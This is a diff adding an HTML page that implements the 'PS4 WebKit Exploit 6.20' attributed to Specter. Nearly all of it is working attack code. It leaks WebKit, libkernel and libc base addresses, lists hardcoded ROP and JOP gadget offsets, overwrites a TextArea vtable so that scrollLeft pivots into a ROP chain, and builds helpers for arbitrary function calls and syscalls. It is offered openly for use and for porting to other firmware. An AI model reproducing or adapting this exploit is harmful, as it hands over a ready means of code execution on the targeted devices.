@@ -1,0 +1,410 @@
+<!--
+* PS4 WebKit Exploit 6.20
+* By Specter (@SpecterDev)
+* -
+* This file contains implementation for a JavaScriptCore (JSC) exploit targetting the
+* PlayStation 4 on 6.20 firmware. The functions in this file specifically setup a framework
+* for code execution via ROP chains using the read/write and leak primitives setup in wkexploit.js.
+* This part of the exploit will need to be adjusted when targetting different firmwares due to hardcoded
+* ROP gadgets, as well as reliance on WebKit internals that have changed between 5.0x and 6.0x.
+* -
+* A brief overview of the code execution exploit strategy...
+*
+* It seems Sony made some pretty interesting changes to WebKit between 5.0x and 6.0x firmwares, as can
+* be seen via their open source software page. As such, the former method qwertyoruiop used to get execution
+* via overwriting parseFloat()'s function pointer didn't immediately work, so I switched to a different strategy.
+*
+* This exploit targets a vtable of a TextArea DOM object - the scrollLeft() method specifically. By smashing scrollLeft()'s
+* function pointer to point to that of a JOP chain, we can set things up to jump into ROP. For more on how this works, see
+* lines 193-256. For gadgets for porting to older firmwares, lines 133-168 will be of interest.
+*
+* If you're not porting, you should add your own stuff after line 383.
+-->
+
+<html>
+<head>
+    <title>PS4 6.20 WebKit Exploit</title>
+    <script src="wkexploit.js"></script>
+    <script src="rop.js"></script>
+    <script src="syscalls.js"></script>
+
+    <style>
+        h1 {
+            overflow: hidden;
+            position: fixed;
+            position: absolute;
+            top: 40%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+    </style>
+</head>
+<body>
+    <script>
+        // Helper functions
+        function debug(str)
+        {
+            document.getElementById("debug").innerHTML += str + "<br />";
+        }
+
+        function print(str)
+        {
+            debug(str);
+        }
+
+        // Called from main() in wkexploit.js when the exploit finishes running
+        window.postExploit = function(p)
+        {
+            debug("---------- Phase 3: Userland Code Execution ----------")
+            window.nogc = [];
+            window.syscalls    = {};
+
+            p.debugDumpAndSend = function(addr, size)
+            {
+                var numElem    = size / 4;
+                var dataToSend = new Uint32Array(numElem);
+
+                for(var i = 0; i < numElem; i++)
+                    dataToSend[i] = p.read4(addr.add32(i * 4)).low;
+
+                debugSendData(dataToSend);
+            }
+
+            p.malloc = function(size)
+            {
+                var backing = new Uint8Array(size);
+                window.nogc.push(backing);
+
+                var ptr = p.read8(p.leakval(backing).add32(0x10));
+                ptr.backing = backing;
+
+                return ptr;
+            }
+
+            p.malloc32 = function(size)
+            {
+                var backing = new Uint8Array(size*4);
+                window.nogc.push(backing);
+
+                var ptr = p.read8(p.leakval(backing).add32(0x10));
+                ptr.backing = new Uint32Array(backing);
+
+                return ptr;
+            }
+
+            var get_jmptgt = function (addr)
+            {
+                var z = p.read4(addr).low & 0xffff;
+                var y = p.read4(addr.add32(2)).low;
+                if (z != 0x25ff)
+                    return 0;
+                return p.read8(addr.add32(y + 6));
+            };
+
+            try
+            {
+                // Get a TextArea vtable address. This will serve two purposes:
+                //    1: Defeat uASLR of WebKit
+                //    2: Code execution via faking a vtable
+
+                // Find webkit base
+                var textArea = document.createElement("textarea");
+                var textAreaVtPtr  = p.read8(p.leakval(textArea).add32(0x18));
+                var textAreaVtable = p.read8(textAreaVtPtr);
+                var webKitBase     = textAreaVtable.sub32(0x2265DE8);
+                webKitBase.low    &= 0xFFFFC000;
+
+                textArea.rows = 0x41424344;
+
+                debug("Found WebKit Base: 0x" + webKitBase.toString(16));
+
+                // Find libkernel + libc base
+                var libKernelBase  = get_jmptgt(webKitBase.add32(0xC8));
+                libKernelBase.sub32inplace(0x2D4A0);
+
+                debug("Found LibKernel Base: 0x" + libKernelBase.toString(16));
+
+                var libSceLibcBase = get_jmptgt(webKitBase.add32(0xE8));
+                libSceLibcBase.sub32inplace(0xB4AD0);
+
+                debug("Found Libc Base: 0x" + libSceLibcBase.toString(16));
+
+                // Construct gadget list
+                var gadgetcache = {
+                    "ret":      0x0000003C,
+                    "infloop":  0x00299B01,
+
+                    "pop rdi":  0x0009E67D,
+                    "pop rsi":  0x000756CB,
+                    "pop rdx":  0x002516B2,
+                    "pop rcx":  0x000348D3,
+                    "pop r8":   0x00079211,
+                    "pop r9":   0x000CDB41,
+                    "pop rax":  0x00075BDF,
+                    "pop rbp":  0x000000B6,
+                    "pop rsp":  0x00075D9A,
+
+                    "mov rax, rdi":     0x00008CD0,
+                    "mov rdx, rdi":     0x006271FE,
+                    "mov rax, rdx":     0x0007BC20,
+                    "mov rax, [rax]":   0x0002DC22,
+                    "mov [rdi], rsi":   0x00034EF0,
+                    "mov [rdi], rax":   0x0001FB49,
+                    "mov [rax], rdi":   0x017629A7,
+                    "mov [rax], rsi":   0x0133139D,
+                    "mov rdx, [rcx]":   0x001848F4,
+
+                    "add rax, rcx":     0x0018E2D0,
+                    "add rax, rsi":     0x013F9533,
+                    "and rax, rcx":     0x00108B63,
+
+                    "jmp rdi": 0x000A2EA6,
+                };
+
+                var longJmpOffset  = 0xC1818;   // libc offset
+                var setJmpOffset   = 0xC179C;   // libc offset
+                var JOPGadgetOne   = 0x6A9D0E;  // webkit offset
+                var JOPGadgetTwo   = 0x18CD2D;  // webkit offset
+                var JOPGadgetThree = 0xCA74C2;  // webkit offset
+                var errnoOffset    = 0x893F0;   // libkernel offset
+
+                window.gadgets = {};
+
+                for(var gadgetname in gadgetcache)
+                {
+                    if(gadgetcache.hasOwnProperty(gadgetname))
+                    {
+                        window.gadgets[gadgetname] = webKitBase.add32(gadgetcache[gadgetname]);
+                    }
+                }
+
+                // Construct a corrupted/fake vtable
+                var vtableSize = 0x6E8 / 4;
+                var fakeVtable = new Uint32Array(vtableSize);
+                var originalVt = new Uint32Array(vtableSize);
+                var context    = p.malloc(0x100);
+                var jopBuf     = p.malloc(0x1000);
+                var longJmpBuf = p.malloc(0x1000);
+
+                var fakeVtableAddr = p.read8(p.leakval(fakeVtable).add32(0x10));
+                var originalVtAddr = p.read8(p.leakval(originalVt).add32(0x10));
+
+                // We'll copy the original vtable into our buffer and make a copy to restore when ROP chains are finished
+                for(var i = 0; i < vtableSize; i++)
+                {
+                    fakeVtable[i] = p.read4(textAreaVtable.add32(i * 4)).low;
+                    originalVt[i] = fakeVtable[i];
+                }
+
+                // For testing: webKitBase.add32(0x299B01) = infloop
+                p.launchchain = function(ropObj)
+                {
+                    // Construct ROP chain
+                    var ropStack    = ropObj.stack;
+
+                    ropObj.push(window.gadgets["pop rdx"]);
+                    ropObj.push(context);
+                    ropObj.push(libSceLibcBase.add32(longJmpOffset)); // longjmp
+
+                    // Get current context
+                    fakeVtable[0x77] = libSceLibcBase.add32(setJmpOffset).hi; // setjmp
+                    fakeVtable[0x76] = libSceLibcBase.add32(setJmpOffset).low;
+
+                    p.write8(textAreaVtPtr, fakeVtableAddr);
+
+                    // Run setjmp
+                    textArea.scrollLeft = 0x0;
+
+                    // Copy context for later
+                    for(var i = 0; i < 0x100; i += 8)
+                    {
+                        p.write8(context.add32(i), p.read8(textAreaVtPtr.add32(i)));
+                    }
+
+                    // Construct a JOP chain to call longjmp to pivot
+
+                    // JOP chain:
+                    //
+                    // JOP gadget 1: mov rax, qword [rdi+0x00000700] ; call qword [rax]
+                    // JOP gadget 2: mov rbx, qword [rax+0x000009A0] ; call qword [rax+0x998]
+                    // JOP gadget 3: mov rdx, rbx ; call qword [rax+0x10]
+
+                    // Write JOP gadget locations
+                    p.write8(jopBuf.add32(0x00), webKitBase.add32(JOPGadgetTwo));    // JOP gadget 2 - 0x18CD2D
+                    p.write8(jopBuf.add32(0x9A0), longJmpBuf);                   // Buffer for setting context
+                    p.write8(jopBuf.add32(0x998), webKitBase.add32(JOPGadgetThree));   // JOP gadget 3 - 0xCA74C2
+                    p.write8(jopBuf.add32(0x10), libSceLibcBase.add32(longJmpOffset)); // Call longjmp
+
+                    // We'll use the original context values then modify only the ones we need
+                    for(var i = 0; i < 0x100; i += 8)
+                    {
+                        p.write8(longJmpBuf.add32(i), p.read8(context.add32(i)));
+                    }
+
+                    p.write8(longJmpBuf.add32(0x00), window.gadgets["ret"]);
+                    p.write8(longJmpBuf.add32(0x10), ropStack); // RSP = ropStack
+                    p.write8(longJmpBuf.add32(0x18), ropStack); // RBP = ropStack
+
+                    // Set new context
+                    fakeVtable[0x77] = webKitBase.add32(JOPGadgetOne).hi;  // JOP gadget 1
+                    fakeVtable[0x76] = webKitBase.add32(JOPGadgetOne).low;
+
+                    p.write8(textAreaVtPtr, fakeVtableAddr);
+                    p.write8(textAreaVtPtr.add32(0x700), jopBuf);
+
+                    // Trigger JOP chain
+                    textArea.scrollLeft = 0x0;
+
+                    // Restore old vtable
+                    for(var i = 0; i < (vtableSize * 4); i += 8)
+                    {
+                        p.write8(textAreaVtPtr.add32(i), p.read8(originalVtAddr.add32(i)));
+                    }
+                };
+
+                window.p = p;
+
+                // Dynamically resolve syscall wrappers from libkernel
+                var kview = new Uint8Array(0x1000);
+                var kstr = p.leakval(kview).add32(0x10);
+                var orig_kview_buf = p.read8(kstr);
+                
+                p.write8(kstr, libKernelBase);
+                p.write4(kstr.add32(8), 0x40000);
+
+                var countbytes;
+
+                for (var i=0; i < 0x40000; i++)
+                {
+                    if (kview[i] == 0x72 && kview[i+1] == 0x64 && kview[i+2] == 0x6c && kview[i+3] == 0x6f && kview[i+4] == 0x63)
+                    {
+                        countbytes = i;
+                        break;
+                    }
+                }
+
+                p.write4(kstr.add32(8), countbytes + 32);
+                
+                var dview32 = new Uint32Array(1);
+                var dview8 = new Uint8Array(dview32.buffer);
+                
+                for (var i=0; i < countbytes; i++)
+                {
+                    if (kview[i] == 0x48 && kview[i+1] == 0xc7 && kview[i+2] == 0xc0 && kview[i+7] == 0x49 && kview[i+8] == 0x89 && kview[i+9] == 0xca && kview[i+10] == 0x0f && kview[i+11] == 0x05)
+                    {
+                        dview8[0] = kview[i+3];
+                        dview8[1] = kview[i+4];
+                        dview8[2] = kview[i+5];
+                        dview8[3] = kview[i+6];
+                        var syscallno = dview32[0];
+                        window.syscalls[syscallno] = libKernelBase.add32(i);
+                    }
+                }
+
+                // Helpful chain for common operations
+                var chain = new rop();
+
+                p.call = function(rip, rdi, rsi, rdx, rcx, r8, r9)
+                {
+                    chain.clear();
+
+                    chain.fcall(rip, rdi, rsi, rdx, rcx, r8, r9);
+
+                    // Get the return value
+                    chain.push(window.gadgets["pop rdi"]);
+                    chain.push(chain.retbuf);
+                    chain.push(window.gadgets["mov [rdi], rax"]);
+
+                    chain.run();
+
+                    return p.read8(chain.retbuf);
+                };
+
+                p.syscall = function(sysc, rdi, rsi, rdx, rcx, r8, r9)
+                {
+                    if (typeof sysc == "string")
+                    {
+                        sysc = window.syscallnames[sysc];
+                    }
+
+                    if (typeof sysc != "number")
+                    {
+                        throw new Error("invalid syscall");
+                    }
+
+                    var off = window.syscalls[sysc];
+
+                    if (off == undefined)
+                    {
+                        throw new Error("invalid syscall");
+                    }
+
+                    return p.call(off, rdi, rsi, rdx, rcx, r8, r9);
+                };
+
+                p.stringify = function (str) {
+                    var bufView = new Uint8Array(str.length + 1);
+                    for (var i = 0; i < str.length; i++) {
+                        bufView[i] = str.charCodeAt(i) & 0xFF;
+                    }
+                    window.nogc.push(bufView);
+                    return p.read8(p.leakval(bufView).add32(0x10));
+                };
+
+                p.writeString = function (addr, str)
+                {
+                    for (var i = 0; i < str.length; i++)
+                    {
+                        var byte = p.read4(addr.add32(i));
+                        byte &= 0xFFFF0000;
+                        byte |= str.charCodeAt(i);
+                        p.write4(addr.add32(i), byte);
+                    }
+                }
+
+                p.readString = function (addr) {
+                    var byte = p.read4(addr).low;
+                    var str  = "";
+
+                    while (byte & 0xFF)
+                    {
+                        str += String.fromCharCode(byte & 0xFF);
+                        addr.add32inplace(1);
+                        byte = p.read4(addr).low;
+                    }
+                    return str;
+                }
+
+                // Clear errno
+                var errno = libKernelBase.add32(0x893F0);
+                p.write8(errno, 0);
+
+                /////////////////////////////////////////////////////////////////////////////////////
+                /////////////////////////////////////////////////////////////////////////////////////
+                //  ADD STUFF HERE
+                /////////////////////////////////////////////////////////////////////////////////////
+                /////////////////////////////////////////////////////////////////////////////////////
+
+                debug("---------- Test: sys_getuid + sys_getpid ----------")
+
+                debug("<b>sys_getpid(): 0x" + p.syscall("sys_getpid") + "</b>");
+                debug("<b>sys_getuid(): 0x" + p.syscall("sys_getuid") + "</b>");
+            } catch(e) {
+                 alert("Exception: " + e);
+            }
+        }
+
+        window.onload = function() {
+            document.getElementById("go").innerHTML = '<a href="javascript:main()">GO</a>';
+        };
+    </script>
+    <center>
+        <h1 id="go"></h1>
+
+        <script>document.write(navigator.userAgent + "<br /><br />");</script>
+        This exploit targets firmware 6.20 but should also work on lower firmwares when gadgets are ported.<br />
+        by <a href="http://twitter.com/specterdev">Specter</a><br />
+    </center>
+    <pre id="debug"></pre>
+</body>
+</html>
